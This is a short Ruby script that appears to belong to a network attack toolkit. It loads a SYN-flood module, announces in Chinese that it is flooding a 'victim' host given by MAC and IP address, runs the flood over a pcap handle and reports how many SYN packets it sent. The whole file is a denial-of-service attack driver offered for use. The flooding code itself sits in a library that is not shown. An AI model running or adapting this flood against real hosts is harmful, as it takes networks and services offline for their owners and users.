require_relative '../lib/attack_tool/tcp/syn_flood.rb'
require_relative '../config_con_var.rb'

run{
	puts "开始向mac为#{color_purple(mac_to_semi_hex($victim_mac))}，ip为#{color_purple(arr_to_dot_dec($victim_ip))}的主机syn洪泛"
	TCPP.syn_flood($pcap)
	puts "syn洪泛完成, 共发送了#{$port_range.max-$port_range.min} 个syn包"
}